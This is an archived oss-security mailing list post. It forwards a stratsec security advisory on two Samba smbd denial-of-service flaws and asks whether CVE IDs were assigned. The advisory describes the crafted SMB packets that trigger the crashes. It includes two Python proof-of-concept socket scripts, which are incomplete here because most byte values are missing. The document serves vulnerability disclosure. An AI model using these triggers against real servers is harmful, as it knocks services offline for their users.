  oss-security - Re: Fwd: [Full-disclosure] stratsec Security Advisory Samba Multiple DoS Vulnerabilities            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [<thread-prev] [thread-next>] [day] [month] [year] [list]  Date: Tue, 25 May From: Thomas Biege <thomas@...ell.com> To: oss-security@...ts.openwall.com Cc: "Steven M. Christey" <coley@...us.mitre.org> Subject: Re: Fwd: [Full-disclosure] stratsec Security Advisory Samba Multiple DoS Vulnerabilities   So far no assignments were made, right?  Am Donnerstag 20 Mai schrieb Thomas Biege: > Hello oss-security, > was a CVE-ID assigned for this issue already? >  > Thanks, > Thomas >  >  > ----------  Forwarded Message  ---------- >  > Subject: [Full-disclosure] stratsec Security Advisory Samba > Multiple DoS Vulnerabilities > Date: Mittwoch 12 Mai > From: stratsec Advisories <advisories@...atsec.net> > An:  "full-disclosure@...ts.grok.org.uk" > <full-disclosure@...ts.grok.org.uk> >  > =========================================================================== > ==== stratsec Security Advisory: > =========================================================================== > ==== >  > Title:           Samba Multiple DoS Vulnerabilities > Version:         1.0 > Issue type:      Multiple > Affected vendor: Samba > Release date:    > Discovered by:   Laurent GaffiĂŠ > Issue status:    Patch available >  > =========================================================================== > ==== >  > Summary > ------- >  > Two vulnerabilities were discovered within in the Samba Smbd daemon which > allow > an attacker to trigger a null pointer dereference or an uninitialized > variable read by sending a specific 'Sessions Setup AndX' query. > Successful exploitation > of these issues will result in a denial of service. >  > Description > ----------- >  > The Server Message Block (SMB) protocol, also known as Common Internet File > System (CIFS) acts as an application-layer protocol to provide shared > access to > files, printers and Inter-Process Communication (IPC). It is also a > transport for Distributed Computing Environment / Remote Procedure Call > (DCE / RPC) operations. After negotiating an SMB communication the client > sends a 'Session Setup AndX' packet to negotiate a session in order to be > able to connect on a specific share. >  > To trigger the null pointer dereference, the client needs to send a crafted > SMB > 'Negotiate Protocol' query with the SMB header 'Flags2' set to > (no Unicode), followed by a Session Setup AndX request with the SMB header > 'Flags2' set to (Unicode). This sequence will result in a crash > within > the Smbd process. >  > The uninitialised Variable Read issue, can be triggered if the client sends > a crafted 'Session Setup AndX' with a 'security blob length' value set to > '\xff\xff'. >  > Impact > ------ >  > A remote attacker can cause a denial of service within the Samba daemon >  > Affected products > ----------------- >  > Samba and Samba <= >  > Proof of concept > ---------------- >  > To trigger the uninitialised variable read issue, the following Python > proof of concept is available: >  > import sys,socket > from socket import * >  > if len(sys.argv)<=1: >  sys.exit('Usage: python smbd.py >  > host = >  > packetnego=( > > > > > > > > > > > > > ) >  > payload=( > > > > > > > > > > > > > > > > > > > > > > > > > > > > > ) >  > s = socket(AF_INET, SOCK_STREAM) > s.connect(host) > s.send(''.join(packetnego)) > s.send(''.join(payload)) >  >  > To trigger the null pointer dereference issue this Python proof of > concept is available: >  > import sys,socket > from socket import * >  > if len(sys.argv)<=1: >  sys.exit('python smbd.py >  > host = >  > packetnego=( > > > > > > > > > > > ) >  > payload=( > > > > > "\xff\xff"  ## Security blob set to \xff\xff here > > > > > > > > > > > > > ) > s = socket(AF_INET, SOCK_STREAM) > s.connect(host) > s.send(''.join(packetnego)) > s.send(''.join(payload)) >  > Solution > -------- >  > Update to version or (http://samba.org/) >  > Response timeline > ----------------- >  > * - Null pointer dereference issue reported to vendor. > * - Vendor acknowledges receipt of advisory 2 hours after >                receiving the initial email > * - Vendor confirms issue presence, and provide a patch 3 >                hours after receiving the initial email. > * - stratsec confirms patch resolves issue. > * - Uninitialised Variable Read issue reported to vendor. > * - Vendor confirms the issue and provides a patch 5 hours >                after receiving the initial email. > * - stratsec confirms patch resolves issue > * - Version released by the vendor fixing both issues. > * - Version released by the vendor fixing both issues. > * - This advisory published. >  > References > ---------- > * Vendor advisory: > * > * stratsec would like to thanks the Samba Security Team for their >   responsiveness while handling theses issues >  > =========================================================================== > ==== >  > About stratsec > -------------- > stratsec, specialises in providing information security consulting and > testing services for government and commercial clients. Established in > we are now one of the leading independent information security > companies in the Australasian and SE-Asian region, with offices throughout > Australia and in Singapore and Malaysia. >  > For more information, please visit our website at http://www.stratsec.net/ >  > =========================================================================== > ====  --   Thomas Biege <thomas@...ell.com>, SUSE LINUX, Security Support & Auditing  SUSE LINUX Products GmbH, GF: Markus Rex, HRB (AG Nuernberg)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      